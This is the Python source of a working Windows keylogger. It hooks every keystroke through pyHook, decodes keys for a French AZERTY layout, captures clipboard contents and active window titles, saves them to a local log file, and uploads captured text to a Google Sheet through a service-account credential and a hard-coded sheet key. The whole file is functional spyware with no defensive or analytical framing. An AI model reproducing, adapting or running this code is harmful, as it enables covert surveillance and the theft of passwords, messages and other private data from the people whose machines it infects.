# -*- coding: utf-8 -*-
import pythoncom
import pyHook
import os
import sys
import win32event
import win32api
import winerror
import argparse
import time
import gspread
from oauth2client.service_account import ServiceAccountCredentials

#Global variables
PATH_LOGS = 'keylogs.txt'
GSHEET_KEY = '15okwR0eO_WRlAtIc6HLRgjOQ8rpYerWwMg6-EyCIblI'
CLIENT_CREDS = 'client_secret.json'

def gsheetinit(key):
    # use creds to create a client to interact with the Google Drive API
    scope = ['https://spreadsheets.google.com/feeds']
    creds = ServiceAccountCredentials.from_json_keyfile_name(CLIENT_CREDS, scope)
    client = gspread.authorize(creds)

    # Find a workbook by name and open the first sheet
    # Make sure you use the right name here.
    # sheet = client.open_by_key("Keylogger Demo").sheet1
    sheet = client.open_by_key(key).sheet1

    # Extract and print all of the values
    # list_of_hashes = sheet.get_all_records()
    # print(list_of_hashes)
    return sheet

# Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print("Multiple Instance not Allowed")
    exit(0)

class Keylogger():

    def __init__(self):
        self.logs = ''
        self.data = ''
        self.context = ''
        self.context_chg = 0
        self.caps = 0
        self.shift = 0
        self.alt = 0
        self.lastclipboard = ''
        self._clipboard = ''

    # get clipboard data
    @property
    def clipboard(self):
        import win32clipboard
        win32clipboard.OpenClipboard()
        tmp = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return tmp

    # Local storage of logs
    def local_logs(self):
        if len(self.data) > 0:
            with open(PATH_LOGS, "a") as log_file:
                if self.context_chg:
                    log_file.write('\r' + self.context + '\r')
                    log_file.write(self.data)
                    log_file.close()
                else:
                    log_file.write(self.data)
                    log_file.close()
                self.data = ''
        return True

    # Send logs to google form
    def gsheet_logs(self, data):
        if len(data) > 20:
            print('>Sending to the cloud<')
            row = [self.context, time.ctime(), data]
            index = 1
            sheet = gsheetinit(GSHEET_KEY)
            try:
                sheet.insert_row(row, index)
                self.data = ''
            except:
                print('error fatal man')
            self.data = ''
            print('yes')
        return True

    def corresp(self, key):
        if self.caps and key in 'AZERTYUIOPQSDFGHJKLMWXCVBN1234567890':
            self.data += key
        # Numbers
        elif key == '1':
            self.data += '&'
        elif key == '2':
            self.data += 'é'
        elif key == '3':
            if self.alt:
                self.data += '#'
            else:
                self.data += '"'
        elif key == '4':
            if self.alt:
                self.data += '{'
            else:
                self.data += '\''
        elif key == '5':
            if self.alt:
                self.data += '['
            else:
                self.data += '('
        elif key == '6':
            if self.alt:
                self.data += '|'
            else:
                self.data += '-'
        elif key == '7':
            self.data += 'è'
        elif key == '8':
            if self.alt:
                self.data += '\\'
            else:
                self.data += '_'
        elif key == '9':
            if self.alt:
                self.data += '^'
            else:
                self.data += 'ç'
        elif key == '0':
            if self.alt:
                self.data += '@'
            else:
                self.data += 'à'
        # Letters
        elif key == 'Space':
            self.data += ' '
        elif key == 'A':
            self.data += 'a'
        elif key == 'B':
            self.data += 'b'
        elif key == 'C':
            self.data += 'c'
        elif key == 'D':
            self.data += 'd'
        elif key == 'E':
            self.data += 'e'
        elif key == 'F':
            self.data += 'f'
        elif key == 'G':
            self.data += 'g'
        elif key == 'H':
            self.data += 'h'
        elif key == 'I':
            self.data += 'i'
        elif key == 'J':
            self.data += 'j'
        elif key == 'K':
            self.data += 'k'
        elif key == 'L':
            self.data += 'l'
        elif key == 'M':
            self.data += 'm'
        elif key == 'N':
            self.data += 'n'
        elif key == 'O':
            self.data += 'o'
        elif key == 'P':
            self.data += 'p'
        elif key == 'Q':
            self.data += 'q'
        elif key == 'R':
            self.data += 'r'
        elif key == 'S':
            self.data += 's'
        elif key == 'T':
            self.data += 't'
        elif key == 'U':
            self.data += 'u'
        elif key == 'V':
            self.data += 'v'
        elif key == 'W':
            self.data += 'w'
        elif key == 'X':
            self.data += 'x'
        elif key == 'Y':
            self.data += 'y'
        elif key == 'Z':
            self.data += 'z'
        # Numpad
        elif key == 'Numpad1':
            self.data += '1'
        elif key == 'Numpad2':
            self.data += '2'
        elif key == 'Numpad3':
            self.data += '3'
        elif key == 'Numpad4':
            self.data += '4'
        elif key == 'Numpad5':
            self.data += '5'
        elif key == 'Numpad6':
            self.data += '6'
        elif key == 'Numpad7':
            self.data += '7'
        elif key == 'Numpad8':
            self.data += '8'
        elif key == 'Numpad9':
            self.data += '9'
        elif key == 'Numpad0':
            self.data += '0'
        elif key == 'Divide':
            self.data += '/'
        elif key == 'Multiply':
            self.data += '*'
        elif key == 'Subtract':
            self.data += '-'
        elif key == 'Add':
            self.data += '+'
        elif key == 'Decimal':
            self.data += '.'
        # OEM
        elif key == 'Oem_Comma':
            if self.caps:
                self.data += '?'
            else:
                self.data += ','
        elif key == 'Oem_Period':
            if self.caps:
                self.data += '.'
            else:
                self.data += ';'
        elif key == 'Oem_2':
            if self.caps:
                self.data += '/'
            else:
                self.data += ':'
        elif key == 'Oem_8':
            if self.caps:
                self.data += '§'
            else:
                self.data += '!'
        elif key == 'Oem_3':
            if self.caps:
                self.data += '%'
            else:
                self.data += 'ù'
        elif key == 'Oem_5':
            if self.caps:
                self.data += 'µ'
            else:
                self.data += '*'
        elif key == 'Oem_1':
            if self.caps:
                self.data += '£'
            else:
                self.data += '$'
        elif key == 'Oem_4':
            if self.caps:
                self.data += '°'
            elif self.alt:
                self.data += ']'
            else:
                self.data += ')'
        elif key == 'Oem_Plus':
            if self.caps:
                self.data += '+'
            elif self.alt:
                self.data += '}'
            else:
                self.data += '='
        else:
            self.data += key

    def OnKeyboardEvent(self, event):
        data_logs = (event.WindowName, event.Window, event.Time, event.Ascii, event.KeyID, event.Key, event.Alt)
        print(data_logs)  # debugging
        if event.KeyID == 27:  # ESC quit the keylogger
            exit(1)
        elif event.Key == 'Lshift' or event.Key == 'Rshift':  # shift
            self.caps = not self.caps
        elif event.Key == 'Capital':  # caps lock
            self.caps = not self.caps
        elif event.Key == 'Rmenu':  # alt gr
            self.alt = not self.alt
        elif event.Key == 'Back' or event.Key == 'Delete':  # del
            self.data += '<Del>'
        else:
            if self.lastclipboard != self.clipboard:
                self.lastclipboard = self.clipboard
                print(self.clipboard)
                with open(PATH_LOGS, "a") as log_file:
                    log_file.write('\r === ClipBoard Content === \r')
                    log_file.write(self.clipboard)
                    log_file.write('\r ===  === \r')
                    log_file.close()
            self.corresp(event.Key)
            # self.data = self.data+key
            if event.WindowName != self.context:
                self.context = event.WindowName
                self.context_chg = 1
            print(self.data)  # debugging
            self.gsheet_logs(self.data)
            self.context_chg = 0
        return True  # needs to return an integer value

    def OffKeyboardEvent(self, event):
        if event.Key == 'Lshift' or event.Key == 'Rshift':
            self.caps = 0
        elif event.Key == 'Rmenu':
            self.alt = 0
        return True


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Keylogger")
    parser.add_argument('-l', default='keylogs.txt', help='File to store logs')
    parser.add_argument('-k', default='', help='Store to google sheet, key referencing the sheet')
    args = parser.parse_args()

    obj = pyHook.HookManager()
    kl = Keylogger()
    obj.KeyDown = kl.OnKeyboardEvent
    obj.KeyUp = kl.OffKeyboardEvent
    obj.HookKeyboard()
    pythoncom.PumpMessages()